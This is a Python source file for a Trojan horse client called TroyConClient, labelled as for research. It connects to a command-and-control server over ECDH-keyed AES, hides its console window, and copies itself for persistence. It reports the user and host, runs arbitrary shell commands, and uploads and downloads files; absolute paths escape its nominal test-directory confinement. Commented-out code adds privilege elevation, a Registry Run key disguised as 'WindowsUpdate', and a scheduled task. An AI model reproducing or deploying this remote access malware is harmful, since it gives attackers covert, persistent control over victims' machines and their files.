import os
import sys
import socket
import locale
# Uncomment this section if you intend to use the shutil module.
# import shutil 
import subprocess
import threading
import time
import ctypes
import base64
from .constants import (RECONNECTION_DELAY_SECONDS)
# Needed when registering in the registry
# from winreg import SetValueEx, CreateKey, HKEY_CURRENT_USER, REG_SZ
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

class TroyConClient:
    """
    Network-based Trojan Horse Client Class (For Research Purposes)

    - Connects to a C2 server to receive commands, execute them, and send back results.
    - All communications are protected with AES symmetric key encryption (using the cryptography library).
    - When running on Windows, the console window is hidden to ensure stealth.
    - Achieves persistence via self-replication within a specified test directory.
    - All filesystem and command execution operations are confined within the designated 'test directory'.
    - Includes file upload and download capabilities.
    """

    def __init__(self, server_ip: str, server_port: int, test_dir: str = None, persistence_dir: str = None):
        """
        Client initialization method

        :param server_ip: IP address of the C2 server
        :param server_port: Port number of the C2 server
        :param aes_key: AES symmetric key for communication encryption (32 bytes)
        :param test_dir: Directory path where all client operations (file creation, command execution) are restricted.
                         If not specified, the current directory at client startup is used.
                         Strongly recommended to set this value for safety in research environments.
        :param persistence_dir: Directory path where the client will copy itself for persistence.
                                If not specified, the current directory at client startup is used.
                                Strongly recommended to set this value for safety in research environments.
        """
        self.server_ip = server_ip
        self.server_port = server_port
        self.aes_key = None  # AES symmetric key will be established after ECDH handshake
        self.c2_socket = None  # Socket object for connection with the C2 server

        # Set and change to the test directory
        self.test_dir = test_dir
        self.persistence_dir = persistence_dir
        if self.test_dir:
            try:
                os.makedirs(self.test_dir, exist_ok=True)
                os.chdir(self.test_dir)
                print(f"[Config] Client working directory set to '{self.test_dir}'.")
            except Exception as e:
                print(f"[Error] Failed to set working directory '{self.test_dir}': {e}. Program will terminate.")
                sys.exit(1)

    # -------------------- ECDH Key Exchange (Handshake) --------------------
    def _perform_handshake(self, sock: socket.socket):
        """
        Perform an ECDH handshake with the server over the given socket.

        This method exchanges elliptic-curve public keys with the server using the 
        SECP256K1 curve, computes a shared secret through ECDH (Elliptic Curve Diffie-Hellman),
        and derives a 256-bit AES session key using SHA-256. The resulting symmetric key 
        is stored internally and used to encrypt and decrypt further communication.

        Process:
            1. Receive the server's public key (prefixed with 4-byte length).
            2. Generate client's ECDH key pair (private + public).
            3. Compute the shared secret using ECDH with the received public key.
            4. Derive a 32-byte AES key by hashing the shared secret using SHA-256.
            5. Send the client public key back to the server in uncompressed form.

        Successful execution means both client and server independently derive 
        an identical AES session key without directly transmitting it over the network.

        Returns:
            bool: True if the handshake completes successfully and AES key is generated, 
                False if an error occurs during the process.
        """

        print("[Handshake] Starting ECDH Key Exchange...")

        try:
            # Receive server public key (4-byte length prefix + key bytes)
            len_bytes = sock.recv(4)
            if not len_bytes: return False
            server_pub_len = int.from_bytes(len_bytes, 'big')
            server_pub_bytes = sock.recv(server_pub_len)

            # Generate client ECDH key pair (SECP256K1)
            client_private_key = ec.generate_private_key(ec.SECP256K1(), default_backend())
            client_public_key = client_private_key.public_key()

            # Load server public key and compute shared secret (ECDH)
            server_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
                ec.SECP256K1(), server_pub_bytes
            )
            shared_secret = client_private_key.exchange(ec.ECDH(), server_public_key)
            print(f"[Handshake] Shared Secret: {shared_secret.hex()}")

            # Derive 32-byte AES session key using SHA-256 hash of shared secret
            digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
            digest.update(shared_secret)
            self.aes_key = digest.finalize()
            print(f"[Handshake] AES Key (256-bit): {self.aes_key.hex()}")

            # Send client public key to server (Uncompressed format)
            client_pub_bytes = client_public_key.public_bytes(
                encoding=serialization.Encoding.X962,
                format=serialization.PublicFormat.UncompressedPoint
            )
            
            # Send 4-byte length prefix followed by public key
            sock.sendall(len(client_pub_bytes).to_bytes(4, 'big'))
            sock.sendall(client_pub_bytes)

            print(f"[Handshake] Keys exchanged successfully. AES Key derived.")
            return True

        except Exception as e:
            print(f"[Handshake Error] {e}")
            return False

    # -------------------- Encryption and Decryption Methods (using cryptography) --------------------
    def _encrypt_data(self, data: bytes) -> bytes:
        """
        Encrypt data using AES-CBC mode.
        For each transmission, a new Initialization Vector (IV) is generated to enhance security.

        :param data: Original data to encrypt (bytes)
        :return: Concatenation of IV (16 bytes) and encrypted data (bytes)
        """
        
        if not self.aes_key: raise ValueError("AES Key not established yet.")
        
        iv = os.urandom(16)
        
        # Apply PKCS7 padding
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data) + padder.finalize()

        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_payload = encryptor.update(padded_data) + encryptor.finalize()

        # --- DEBUGGING ENCRYPTION ---
        print(f"DEBUG (Client _encrypt_data): Original data length: {len(data)} bytes")
        print(f"DEBUG (Client _encrypt_data): Padded data length: {len(padded_data)} bytes")
        # ----------------------------
        
        return iv + encrypted_payload # Prepend IV to ciphertext before transmission

    def _decrypt_data(self, data: bytes) -> bytes:
        """
        Decrypt data using AES-CBC mode

        :param data: Received data (IV + ciphertext)
        :return: Decrypted original data (bytes)
        """

        if not self.aes_key: raise ValueError("AES Key not established yet.")

        iv = data[:16]
        ciphertext = data[16:]

        # --- DEBUGGING DECRYPTION ---
        print(f"DEBUG (Client _decrypt_data): Received encrypted data length (IV + ciphertext): {len(data)} bytes")
        print(f"DEBUG (Client _decrypt_data): Received IV (HEX): {iv.hex()}")
        print(f"DEBUG (Client _decrypt_data): Received ciphertext (HEX, first 100 chars): {ciphertext.hex()[:100]}...")
        # ----------------------------

        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        original_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()
        
        return original_data
    
    # -------------------- Stealth and Persistence --------------------
    def _hide_console_window(self):
        """
        Hide the console window when running in a Windows environment.
        - Used to avoid visibility in GUI environments.
        """
        if os.name == 'nt':
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                print("[Stealth] Console window has been hidden.")
            except Exception as e:
                print(f"[Error] Failed to hide console window: {e}")

    def _establish_persistence(self):
        """
        Persistence mechanism: Copies the currently running file to the current directory as 'troycon.py'
        - Allows the program to run from the same path after a reboot
        - Does not copy if the file already exists
        - Windows startup registry registration (disabled)
        """
        if os.name == 'nt':
            try:
                current_exe_path = os.path.abspath(sys.argv[0])
                
                # -----------------------------------------------------------------
                # Used when the executable is not a standalone file and requires additional files or directories to run 
                # Retrieve the directory of the currently running executable.
                # current_exe_dir = os.path.dirname(current_exe_path)

                # Extract the folder name of the current executable’s directory.
                # folder_name = os.path.basename(current_exe_dir)

                # Build the destination path inside the Persistence directory
                # where the entire executable folder will be copied.
                # dest_dir = os.path.join(self.persistence_dir, folder_name)

                # if not os.path.exists(dest_dir):
                #     try:
                #         is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                #     except:
                #         is_admin = False

                #     if not is_admin:
                #         print("[*] Administrator privileges required. Requesting elevation...")

                #         params = " ".join([f'"{arg}"' for arg in sys.argv])
                #         ctypes.windll.shell32.ShellExecuteW(
                #             None, "runas", sys.executable, params, None, 1
                #         )
                #         sys.exit()

                #     try:
                #         shutil.copytree(current_exe_dir, dest_dir)
                #         print(f"[+] Successfully copied to: {dest_dir}")
                #     except Exception as e:
                #         print(f"[Error] Failed to copy directory: {e}")
                # else:
                #     print("[*] dest_dir already exists. No admin elevation needed.")
                # -----------------------------------------------------------------

                # -----------------------------------------------------------------
                # if the executable is a standalone file, use this method to copy just the .exe file
                # Path setup for copying the currently running file (current_exe_path) into the Persistence directory.
                exe_filename  = os.path.basename(current_exe_path)
                no_exe_name = os.path.splitext(exe_filename)[0]
                dest_folder = os.path.join(self.persistence_dir, no_exe_name)
                persistence_target_path = os.path.join(dest_folder, exe_filename)

                if not os.path.exists(dest_folder):
                    os.makedirs(dest_folder, exist_ok=True)

                # Option A (commented out): Use shutil.copy2 to copy the file while preserving metadata (e.g., timestamps).
                # Option B (active code): Manually copy the file in binary mode.
                # Use either method depending on your needs.
                if not os.path.exists(persistence_target_path):
                    # if you need admin rights to copy the file, uncomment below
                    # try:
                    #     is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                    # except:
                    #     is_admin = False

                    # if not is_admin:
                    #     print("[*] Administrator privileges required. Requesting elevation...")

                    #     params = " ".join([f'"{arg}"' for arg in sys.argv])
                    #     ctypes.windll.shell32.ShellExecuteW(
                    #         None, "runas", sys.executable, params, None, 1
                    #     )
                    #     sys.exit()
                    
                    # try:
                    #     shutil.copy2(current_exe_path, persistence_target_path)
                    #     print(f"[Persistence] Copied to '{persistence_target_path}' (Timestamp preserved).")
                    # except Exception as e:
                    #     print(f"[Error] Failed to copy directory: {e}")

                    with open(current_exe_path, 'rb') as src_file, \
                        open(persistence_target_path, 'wb') as dst_file:
                        dst_file.write(src_file.read())
                    print(f"[Persistence] '{current_exe_path}' has been copied to '{persistence_target_path}'.")
                else:
                    print(f"[Persistence] File '{persistence_target_path}' already exists. Skipping copy.")
                # -----------------------------------------------------------------

                # if you want to find the .exe file in the copied folder, uncomment below
                # exe_path = None

                # for root, dirs, files in os.walk(dest_dir):
                #     for file in files:
                #         if file.lower().endswith(".exe"):
                #             exe_path = os.path.join(root, file)
                #             break
                #     if exe_path:
                #         break

                # if not exe_path:
                #     print("[Error] Could not find any executable (.exe) files in the copied folder.")
                #     return False

                # Register in the Registry Run key
                # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
                # key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                # key_handle = CreateKey(HKEY_CURRENT_USER, key_path)
                # SetValueEx(key_handle, "WindowsUpdate", 0, REG_SZ, exe_path)
                # print("Registry Run key registration complete")

                # Register to Task Scheduler
                # task_name = "TroyCon" # Task name for masquerading (Disguise)

                # Check if the task is already registered
                # check_cmd = f'schtasks /query /tn "{task_name}"'
                # check_result = subprocess.run(check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                # if check_result.returncode != 0:
                    # print(f"[*] Starting Task Scheduler registration: {task_name}")

                    # /rl HIGHEST: Run with highest privileges (Admin rights)
                    # /sc onlogon: Run automatically on user logon
                    # cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{exe_path}\\"" /sc onlogon /rl HIGHEST /f'
                    
                    # Execute command in the background without a console window
                    # subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    # print(f"[Persistence] Registered to Task Scheduler as '{task_name}'.")
                # else:
                    # print(f"[Persistence] Task is already registered in the Scheduler.")

            except Exception as e:
                print(f"[Error] Final persistence setup failed: {e}")


    # -------------------- Length-Prefixing Helpers --------------------
    def _send_data_with_length_prefix(self, sock: socket.socket, data: bytes, description: str = "General data"):
        encrypted_data = self._encrypt_data(data)
        length = len(encrypted_data)
        
        if length > 0xFFFFFFFF:
            raise ValueError(f"The length of the encrypted data to send is too large: {length} bytes")

        sock.sendall(length.to_bytes(4, 'big')) # Send 4-byte length prefix
        sock.sendall(encrypted_data) # Send encrypted data
        print(f"(Client send): '{description}' - Sent encrypted data {length} bytes with prefix successfully.")

    def _receive_data_with_length_prefix(self, sock: socket.socket) -> bytes:
        raw_length = b''
        while len(raw_length) < 4:
            chunk = sock.recv(4 - len(raw_length))
            if not chunk:
                raise ConnectionAbortedError("Connection lost while receiving length prefix.")
            raw_length += chunk

        length = int.from_bytes(raw_length, 'big')
        print(f"DEBUG (Client receive): Expecting to receive {length} bytes.")

        received_bytes = b''
        while len(received_bytes) < length:
            chunk = sock.recv(min(4096, length - len(received_bytes)))
            if not chunk:
               raise ConnectionAbortedError("Connection lost while receiving data body.")
            received_bytes += chunk
        
        return self._decrypt_data(received_bytes)

    # -------------------- Command Execution --------------------
    def _execute_command(self, cmd: str) -> bytes:
        """
        Execute shell command and return the result.
        All commands are executed within the client's current working directory (test_dir).

        :param cmd: Command string
        :return: stdout + stderr (bytes)
        """

        if cmd.strip().lower().startswith('cd'):
            try:
                target = cmd.strip()[2:].strip()
                new_dir = os.path.abspath(os.path.join(self.test_dir, target))
                
                if os.path.exists(new_dir) and os.path.isdir(new_dir):
                    self.test_dir = new_dir 
                    return f"[Success] Changed directory to: {self.test_dir}".encode('utf-8')
                else:
                    return f"[Error] Directory not found: {new_dir}".encode('utf-8')
            except Exception as e:
                return f"[Error] {e}".encode('utf-8')
            
        try:
            encoding = locale.getpreferredencoding() or 'utf-8'

            # Execute command using subprocess (capture stdout and stderr)
            proc = subprocess.Popen(cmd, shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    text=True,
                                    encoding=encoding, # Default utf-8 encoding on Windows
                                    errors='replace',
                                    cwd=self.test_dir)
            out, err = proc.communicate() # Wait for execution to complete
            return out.encode('utf-8', errors='replace') + err.encode('utf-8', errors='replace')
        except Exception as e:
            return f"[Command execution error]: {str(e)}".encode('utf-8')

    # -------------------- File Transfer / Reception Functions --------------------
    def _send_file_to_c2(self, file_path_on_client: str) -> bytes:
        """
        Reads a specific file from the client and sends it to the C2 server (upload).

        :param file_path_on_client: File path on the client system (relative to test_dir)
        :return: Transmission result message (success or failure) as bytes
        """
        full_path = os.path.join(self.test_dir, file_path_on_client)
        if not os.path.exists(full_path):
            error_msg = f"FILE_UPLOAD_ERROR: File not found - '{file_path_on_client}'"
            print(f"[Error] {error_msg}")
            return error_msg.encode('utf-8')
        if not os.path.isfile(full_path):
            error_msg = f"FILE_UPLOAD_ERROR: Directory - '{file_path_on_client}'"
            print(f"[Error] {error_msg}")
            return error_msg.encode('utf-8')

        try:
            with open(full_path, 'rb') as f:
                file_content = f.read()

            # Phase 1: Send file metadata (header)
            # Encode file path to Base64 before sending
            encoded_file_path = base64.b64encode(file_path_on_client.encode('utf-8')).decode('ascii')
            header_str = f"FILE_UPLOAD_HEADER:{encoded_file_path}:{len(file_content)}"
            header_bytes = header_str.encode('utf-8')

            print(f"(Client file transfer): Header string to send (Base64 encoded path): '{header_str}'")
            self._send_data_with_length_prefix(self.c2_socket, header_bytes, "File upload header")
            print(f"[File Transfer] File header for '{file_path_on_client}' sent successfully.")

            # Phase 2: Send actual file content
            self._send_data_with_length_prefix(self.c2_socket, file_content, "File content") 
            print(f"[File Transfer] Starting to send file content for '{file_path_on_client}' ({len(file_content)} bytes original).")

            # Wait for server response after file transfer completion
            response_bytes = self._receive_data_with_length_prefix(self.c2_socket)
            response_str = response_bytes.decode('utf-8', errors='ignore')
            print(f"[File Transfer] Server response: {response_str}")
            return response_bytes

        except Exception as e:
            print(f"[Error] File upload failed for '{file_path_on_client}': {e}")
            return f"FILE_UPLOAD_ERROR: Transmission failed - {e}".encode('utf-8')

    def _receive_file_from_c2(self, raw_command_bytes: bytes) -> bytes:
        """
        Receives file data from the C2 server and saves it to the client system (download).

        :param raw_command_bytes: Decrypted bytes containing the 'PUT_FILE' command and file content
        :return: Save result message (success or failure) as bytes
        """

        print(f"DEBUG (Client): _receive_file_from_c2 started. Length of raw_command_bytes: {len(raw_command_bytes)}")

        # Initialize filename variable for error messages in case of save failure
        decoded_remote_file_path = "unknown_file" 

        try:
            put_file_prefix_len = len(b'PUT_FILE:')
            if not raw_command_bytes.startswith(b'PUT_FILE:'):
                raise ValueError("Invalid PUT_FILE format: does not start with 'PUT_FILE:'.")

            header_and_content_bytes = raw_command_bytes[put_file_prefix_len:]
            
            # Find the first colon to extract the encoded path
            first_colon_idx = header_and_content_bytes.find(b':')
            if first_colon_idx == -1: 
                raise ValueError("Invalid PUT_FILE format: no colon found after encodedRemotePath.")

            encoded_remote_path_bytes = header_and_content_bytes[0:first_colon_idx]
            encoded_remote_path_str = encoded_remote_path_bytes.decode('utf-8')
            
            # Decode Base64 path to get the actual remote file path
            decoded_remote_file_path = base64.b64decode(encoded_remote_path_str).decode('utf-8')
            
            # Find the second colon to obtain the file length
            second_colon_idx = header_and_content_bytes.find(b':', first_colon_idx + 1)
            if second_colon_idx == -1: 
                raise ValueError("Invalid PUT_FILE format: no colon found after fileLength.")

            file_length_str = header_and_content_bytes[first_colon_idx + 1:second_colon_idx].decode('utf-8')
            file_length = int(file_length_str)

            file_content_bytes = header_and_content_bytes[second_colon_idx + 1:]

            print(f"DEBUG (Client file receive): Decoded remote file path: '{decoded_remote_file_path}'")
            print(f"DEBUG (Client file receive): Expected file length (header): {file_length} bytes")
            print(f"DEBUG (Client file receive): Actual received file content length: {len(file_content_bytes)} bytes")

            if len(file_content_bytes) != file_length:
                print(f"[Warning] File receive length mismatch: Expected {file_length}B, Actual {len(file_content_bytes)}B")
            
            if not os.path.isabs(decoded_remote_file_path): 
                save_path = os.path.abspath(os.path.join(self.test_dir, decoded_remote_file_path))
            else:
                save_path = decoded_remote_file_path 
            
            target_directory = os.path.dirname(save_path)
            if target_directory and not os.path.exists(target_directory):
                os.makedirs(target_directory, exist_ok=True)
                print(f"DEBUG (Client file receive): Target directory '{target_directory}' created successfully.")

            filename_for_log = os.path.basename(save_path) 

            with open(save_path, 'wb') as f:
                f.write(file_content_bytes)
            print(f"[File Receive] File '{filename_for_log}' ({len(file_content_bytes)} bytes) saved successfully: {save_path}")
            return f"FILE_DOWNLOAD_SUCCESS: '{filename_for_log}' saved successfully.".encode('utf-8')

        except Exception as e:
            fname_for_error = os.path.basename(decoded_remote_file_path) # Use decoded path for error messages
            print(f"[Error] File download and save failed for '{fname_for_error}': {e}")
            return f"FILE_DOWNLOAD_ERROR: Save failed - {e}".encode('utf-8')


    # -------------------- C2 Server Connection and Communication --------------------
    def _connect_and_process_c2_commands(self):
        """
        Attempts TCP connection to the C2 server and, upon success, enters the main loop to receive and process commands.
        Handles file upload and download commands.
        """
        while True:
            try:
                print(f"[C2 Comm] Attempting connection to C2 server ({self.server_ip}:{self.server_port})...")
                self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.c2_socket.connect((self.server_ip, self.server_port))
                print(f"[C2 Comm] Connected to C2 server ({self.server_ip}:{self.server_port}) successfully!")

                if not self._perform_handshake(self.c2_socket):
                    print("[!] Handshake failed. Retrying...")
                    self.c2_socket.close()
                    time.sleep(RECONNECTION_DELAY_SECONDS)
                    continue

                initial_check_in_message = f"CHECK_IN:{os.getlogin()}:{socket.gethostname()}:{sys.platform}".encode('utf-8')
                self._send_data_with_length_prefix(self.c2_socket, initial_check_in_message, "Initial check-in message")
                print(f"[C2 Comm] Initial check-in message sent successfully.")

                while True:
                    cmd_bytes = self._receive_data_with_length_prefix(self.c2_socket)
                    cmd_str_peek = cmd_bytes.decode('utf-8', errors='ignore')[:100]

                    if cmd_str_peek.lower() == 'exit':
                        print("[C2 Comm] 'exit' command received. Closing C2 connection.")
                        break
                    elif cmd_str_peek.upper().startswith('GET_FILE:'):
                        parts = cmd_str_peek.split(':', 1)
                        file_path_on_client = parts[1].strip()
                        print(f"[C2 Comm] 'GET_FILE' command received: '{file_path_on_client}'")
                        self._send_file_to_c2(file_path_on_client)
                    elif cmd_str_peek.upper().startswith('PUT_FILE:'):
                        print(f"[C2 Comm] 'PUT_FILE' command received. Processing file data.")
                        response = self._receive_file_from_c2(cmd_bytes)
                        self._send_data_with_length_prefix(self.c2_socket, response, "PUT_FILE response")
                    else:
                        print(f"[C2 Comm] Shell command execution request received: '{cmd_str_peek}'")
                        command_output = self._execute_command(cmd_bytes.decode('utf-8', errors='ignore'))
                        self._send_data_with_length_prefix(self.c2_socket, command_output, "Shell command result")
                        print("[C2 Comm] Command execution result sent successfully.")

            except ConnectionRefusedError:
                print(f"[C2 Comm Error] Connection refused by C2 server: {self.server_ip}:{self.server_port}. Please check if the server is running.")
            except socket.timeout:
                print("[C2 Comm Error] Socket timeout occurred.")
            except (ConnectionAbortedError, ConnectionResetError) as e:
                print(f"[C2 Comm Error] Connection forcibly closed due to peer or network issue: {e}. Retrying in {RECONNECTION_DELAY_SECONDS} seconds.")
            except Exception as e:
                print(f"[C2 Comm Error] Connection failure or unexpected error occurred: {e}. Retrying in {RECONNECTION_DELAY_SECONDS} seconds.")
            finally:
                if self.c2_socket:
                    self.c2_socket.close()
                    self.c2_socket = None
                time.sleep(RECONNECTION_DELAY_SECONDS)


    # -------------------- Client Start Method --------------------
    def start_client(self):
        """
        Starts the full execution flow of the Trojan client.

        1) Hide console window (Windows)
        2) Self-replication (persistence) within test directory
        3) Start C2 connection thread
        4) Main thread waits indefinitely
        """
        print("[Client Start] Starting TroyConClient...")
        self._hide_console_window()
        self._establish_persistence()

        # Run C2 connection in a background thread
        threading.Thread(target=self._connect_and_process_c2_commands, daemon=True).start()
        print("[Client Start] C2 communication thread started in the background.")

        # Main thread waits indefinitely to prevent program termination
        try:
            while True:
                time.sleep(10)
        except KeyboardInterrupt:
            print("[Client Exit] Client was forcibly terminated by the user.")
        except Exception as e:
            print(f"[Client Exit] The client terminated unexpectedly due to an error: {e}")